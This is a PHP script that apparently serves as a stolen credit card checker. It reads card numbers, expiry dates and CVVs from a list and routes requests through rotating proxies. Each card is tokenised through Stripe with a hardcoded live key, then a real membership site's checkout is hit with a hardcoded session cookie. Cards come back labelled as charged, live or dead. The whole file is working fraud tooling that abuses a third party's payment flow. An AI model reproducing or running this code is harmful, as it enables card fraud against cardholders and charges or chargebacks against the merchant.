<?php 
require 'function.php';
error_reporting(0);
//---------------------------------------//
//---------------------------------------//
#if(file_exists(getcwd().('/cookie.txt'))){
    #@unlink("cookie.txt");
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function random_strings($length_of_string) 
{
    $str_result2 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result2),  
                       0, $length_of_string); 
}
 $mail = 'nexon'.random_strings(5).'';
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

#-------- 1st req----------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /v1/payment_methods h2';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6ef5f860-4b52-4178-981e-8299f408940d113a62&muid=6b3b4575-b860-4192-a6ae-227637d1f3106e4773&sid=494876b1-a9e2-42fd-8308-19b72008fcbeacd04e&payment_user_agent=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&time_on_page=48229&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1FZ6V2FMcEbNK1qQ');
$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
if(empty($id)) {
    $msg = trim(strip_tags(getStr($result1,'"message": "','"')));
echo '#Die</span>  </span>CC:  '.$lista.'</span>  <br>result1: '.$msg.' ❌ </span><br>';
exit;
}
$l4= trim(strip_tags(getStr($result1,'"last4: "','"')));
$brnd= trim(strip_tags(getStr($result1,'"brand: "','"')));
#---------------2nd req ---------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gregalder.com/yardposts/membership-account/membership-checkout/?level=3');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /yardposts/membership-account/membership-checkout/?level=3 HTTP/1.1';
$headers[] = 'Host: gregalder.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Origin: https://gregalder.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://gregalder.com/yardposts/membership-account/membership-checkout/?level=3';
$headers[] = 'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5';
$headers[] = 'Cookie: pmpro_visit=1; __stripe_mid=6b3b4575-b860-4192-a6ae-227637d1f3106e4773; PHPSESSID=heq8kpc5b4g9lp9o8896ouh5th; tk_or=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; tk_r3d=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; tk_lr=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; __stripe_sid=494876b1-a9e2-42fd-8308-19b72008fcbeacd04e';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=3&checkjavascript=1&donation=1&username=nexon&password=123456789&password2=123456789&bemail=nexon608%40gmail.com&bconfirmemail=nexon608%40gmail.com&fullname=&gateway=stripe&CardType='.$brnd.'&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$l4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
$result2 = curl_exec($ch);
 //$msg= trim(strip_tags(getStr($result2,'"message: "','"')));

# ---------------------------------------#

# ---------------- [Responses] ------- ---------- #
if(strpos($result2, "Successful")) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br> Payment Intent Confirmed ⚠️ </span><br>';
exit;
    }

elseif(strpos($result2, "Your Order is Confirmed")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ </span><br>';
    
exit;
}
elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ </span><br>';
    
exit;
}
elseif(strpos($result2, "Congratulations")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ Confirmed </span><br>';
   
exit;
}
elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}
elseif(strpos($result2, "Invoice")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}
elseif(strpos($result2, "Your Membership Is confirmed")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> Insufficient Funds <br>    </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> #CVV LIVE ✅  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> SECURITY CODE IS INVALID  ✅  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅  </span><br>';
    }
  
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> TRANSACTION NOT ALLOWED ❌  </span><br>';
    exit;
    }
elseif(strpos($result2, "does not support this type of purchase")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> Card does not support ❌  </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> 3DSECURE REQUIRED  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> DO NOT HONOR ❌ </span><br>';
}

elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> FRAUDULENT ❌ </span><br>';
}
elseif(strpos($result2, "intent_confirmation_challenge")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Captcha ⚠️ </span><br>';
    }
elseif(strpos($result2, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Your card was declined❌ </span><br>';
}

elseif(strpos($result1, 'Your card number is incorrect.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Incorrect Card Number❌ </span><br>';
}
elseif(strpos($result2, 'Invalid Account')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Account Invalid </span><br>';
}
elseif(strpos($result2, 'expired')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Expired </span><br>';
}

else {
    echo '#DIE </span>  </span>CC:  '.$lista.'</span><br>INFORM OWNER </span><br>';
    
}

curl_close($ch);
ob_flush();

?>